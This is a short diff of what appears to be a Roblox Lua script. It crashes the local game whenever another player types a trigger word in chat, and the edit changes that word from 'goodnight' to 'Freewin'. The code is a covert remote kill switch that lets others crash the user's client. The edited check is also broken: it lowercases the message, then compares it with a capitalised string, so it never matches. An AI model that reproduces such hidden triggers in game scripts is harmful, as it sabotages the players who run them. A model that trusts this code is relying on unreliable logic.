@@ -24,7 +24,7 @@ end
 
 if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
     TextChatService.MessageReceived:Connect(function(message)
-        if message.Text:lower() == "goodnight" and message.TextSource and message.TextSource.UserId ~= LocalPlayer.UserId then
+        if message.Text:lower() == "Freewin" and message.TextSource and message.TextSource.UserId ~= LocalPlayer.UserId then
             crashGame()
         end
     end)
